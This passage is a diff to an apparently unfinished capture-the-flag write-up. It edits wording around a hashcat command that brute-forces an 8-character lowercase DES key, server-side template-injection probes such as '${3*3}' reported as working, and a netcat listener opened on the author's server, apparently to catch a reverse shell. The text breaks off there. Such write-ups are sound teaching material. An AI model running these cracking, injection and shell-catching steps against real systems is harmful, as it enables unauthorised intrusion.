@@ -59,7 +59,7 @@ But it is not now, so I think ECB.
 
 In the hint of the problem, I specified that Key is lowercase.
 
-So, i tried to 8byte brute force using hashcat, then i got a Key value.
+Therefore, i tried to 8byte brute force using hashcat, then i got a Key value.
 
 ```
 $ ./hashcat -m 14000 f8085ba33f9600b3:2d303739662d3464 -a 3 '?l?l?l?l?l?l?l?l'
@@ -162,19 +162,13 @@ pycrypto==2.6.1
 web.py==0.38
 ```
 
-
-
-
-
-### 
+[ 작성중 ]
 
 I tried to few query:
 
 ​	{{3\*3}},${3\*3} , ...
 
 '${3\*3}'! It worked!
-
-
 
 ```
 root@vultr:~# nc -lvp 10101
